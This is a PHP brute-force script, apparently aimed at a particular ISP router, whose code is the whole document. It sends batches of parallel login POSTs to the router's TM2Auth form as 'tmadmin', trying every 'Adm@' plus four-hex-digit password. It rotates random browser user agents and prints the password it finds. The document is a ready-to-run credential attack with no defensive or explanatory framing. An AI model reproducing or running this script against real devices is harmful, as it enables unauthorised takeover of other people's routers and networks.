<?php

date_default_timezone_set('Asia/Kuala_Lumpur'); // Here is important for new PHP version.
define('size', 10); // multithread
define('ip', NULL);
define('start', 0x0); // what hex to start
define('sleept', 10); // sleep time if failed
define('attempt', 10000); // how many attempts
define('usleept', 100000); // micro sleep after current attempt
define('timeout', 10); // timeout for each multi request

if(empty(ip))
{
	echo "where is ip?\n";
	exit();
}

echo "\n"; // newline cikit
$bufn = 0;
$failed = 0;

// start brute force
for($i = start; $i < 0xffff; $i += size) // do n request in one time
{
	/*
	POST http://<ip>/Forms/TM2Auth_1 HTTP/1.1
	LoginNameValue=username&LoginPasswordValue=password
	*/
	
	if($failed >= attempt)
	{
		echo "\nFailed after ".attempt." attempt(s)..\n";
		break;
	}
	
	clear_screen_buffer($bufn + 5);
	
	$info =  "\rTesting with hex ".strtoupper(str_pad(dechex($i), 4, '0', STR_PAD_LEFT))
			." at ".size." requests - Progress : " . floor($i / 0xffff * 100 * 100) / 100 . "%";
			
	echo $info;
	$bufn = strlen($info); // get length to clear prev buffer on screen
	
	$collect_url = array();
	
	// collect all url with custom auth post request
	for($z = 0; $z < size; $z++)
	{
		$pad_hex = strtoupper(str_pad(dechex($i + $z), 4, '0', STR_PAD_LEFT));

		$collect_url[] = array(
			'url' => "http://".ip."/Forms/TM2Auth_1",
			'post' => "LoginNameValue=tmadmin&LoginPasswordValue=Adm@{$pad_hex}"
		);
	}
	
	$results = http_multithread($collect_url, timeout);
	
	if(is_string($results))
	{
		echo "Failed at post data : {$results}\n";
		echo "Sleep for ".sleept." second(s)...\n";
		
		sleep(sleept);
		$failed++;
		
		$i -= size; // so leh continue yng previous balik
		
		continue;
	}
	
	foreach($results as $n => $result)
	{
		$result = ($i + $n) ." :- \n\n{$result}\n\n";
		
		// if success (cara noob)
		if(strpos($result, "TM2Auth.htm") === FALSE) 
		{
			echo "\n\nSuccess!\n";
			echo "Password : " . strtoupper(str_pad(dechex($i + $n), 4, '0', STR_PAD_LEFT)) . "\n";
			break;
		}
	}
	
	usleep(usleept); 
}

function http_multithread($r_link, $timeout)
{
	$curly  = array(); // to store curl handle
	$result = array(); // to store curl respond for each loop
	
	$mh     = curl_multi_init();
	
	foreach ($r_link as $id => $link)
	{
		$curly[$id] = curl_init();
		curl_setopt($curly[$id], CURLOPT_URL, $link['url']);
		curl_setopt($curly[$id], CURLOPT_HEADER, 1);
		curl_setopt($curly[$id], CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($curly[$id], CURLOPT_TIMEOUT, $timeout);
		curl_setopt($curly[$id], CURLOPT_USERAGENT, random_ua()); // ;)

		// sent post data
		curl_setopt($curly[$id], CURLOPT_POST, 1);
		curl_setopt($curly[$id], CURLOPT_POSTFIELDS, $link['post']);
		
		curl_setopt($curly[$id], CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($curly[$id], CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($curly[$id], CURLOPT_TIMEOUT, $timeout);
		curl_setopt($curly[$id], CURLOPT_CONNECTTIMEOUT, $timeout);
		curl_setopt($curly[$id], CURLOPT_FOLLOWLOCATION, false);
		
		curl_multi_add_handle($mh, $curly[$id]);
	}
	
	// execute request in multithread
	$running = null;
	do
	{
		curl_multi_exec($mh, $running);
	} while ($running > 0);
	
	// collect all http responds 
	foreach ($curly as $n => $c)
	{
		$tmp = curl_multi_getcontent($c);
		
		// check if http respond size isnt empty
		if(!empty($tmp))
			$result[] = $tmp;

		else // klau error terus stop untuk debugging
		{
			echo "\n\nError found!\n";
			echo "HTTP respond return no data..\n\n";
			
			print_r($r_link[$n]);
			
			//exit(); // tutup scanning terus
			
			return $r_link[$n]['post'];
		}
			
		curl_multi_remove_handle($mh, $c);
	}
	
	curl_multi_close($mh);
	
	// return all result to caller
	return $result;
}

// thanks jani
function random_ua() {
  return array(
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.99 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36'
    )[mt_rand(0, 19)];
}

function clear_screen_buffer($msg)
{
	echo "\r";
	for ($i = 0; $i < (strlen($msg) + 1); $i++)
		echo " ";
	echo "\r";
}

?>